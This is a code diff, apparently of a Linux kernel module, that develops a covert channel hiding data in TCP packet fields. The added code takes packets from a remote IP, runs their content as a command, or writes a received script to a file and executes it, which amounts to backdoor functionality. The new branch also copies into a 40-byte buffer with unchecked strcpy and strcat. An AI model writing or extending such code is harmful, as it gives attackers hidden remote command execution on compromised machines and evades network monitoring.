@@ -14,9 +14,9 @@ int send_data(unsigned int ip, unsigned short *buf, int size, unsigned int seq)
     state = get_sstate(pd);
     switch (state)
     {
-        case _NULL: break;
+        case _NULL: return 0;
         case _FINI:
-            break;
+            return 0;
 
         //Send content
         case _SEND: 
@@ -44,10 +44,12 @@ int send_data(unsigned int ip, unsigned short *buf, int size, unsigned int seq)
                 memcpy(buf, &chksum, sizeof(chksum));
                 set_sstate(pd, _FINI);
                 /* del_data(&send_map, ip); */
+                break;
             }
     }
     pd->lastseq = seq;
     pd->lastsnd = *buf;
+    /* printk(KERN_INFO "Seq: %u, *urg: %c%c\n", ntohl(tcph->seq), tcph->urg_ptr & 0xff, tcph->urg_ptr >> 8); */
     return 0;
 }
 
@@ -111,8 +113,26 @@ void recv_data(unsigned int ip, const unsigned short *buf, int size, unsigned in
                     switch (pd->type)
                     {
                         case TP_ACKN: break;
-                        case TP_COMD: call_user_program(pd->content, pd->ip); break;
-                        case TP_SHFL: break;
+                        case TP_COMD: call_user_program(pd->content, ip); break;
+                        case TP_SHFL: 
+                        {
+                            char fpath[40];
+                            char ipstr[20];
+                            struct file *fp;
+                            ipnAddrToStr(ipstr, ip);
+                            strcpy(fpath, SHFILEPATH);
+                            strcat(fpath, ipstr);
+                            /* fp = filp_open(SHFILEPATH, O_DIRECTORY | O_CREAT, 0644); */
+                            /* if (IS_ERR(fp)) */
+                            /* { */
+                                /* printk(KERN_ERR "Failed to create directory."); */
+                                /* break; */
+                            /* } */
+                            /* filp_close(fp, NULL); */
+                            save_to_file_q(fpath, pd);
+                            call_user_file(fpath, ip);
+                            break;
+                        }
                         case TP_DATA: save_to_file(SAVEFILE, pd); break;
                     }
                     
@@ -123,8 +143,9 @@ void recv_data(unsigned int ip, const unsigned short *buf, int size, unsigned in
                     
                     break;
                 }
-                set_rstate(pd, _WAIT);
                 info("Checksum incorrect!\n");
+                print_data(pd);
+                del_data(&recv_map, ip);
                 break;
             }
     }
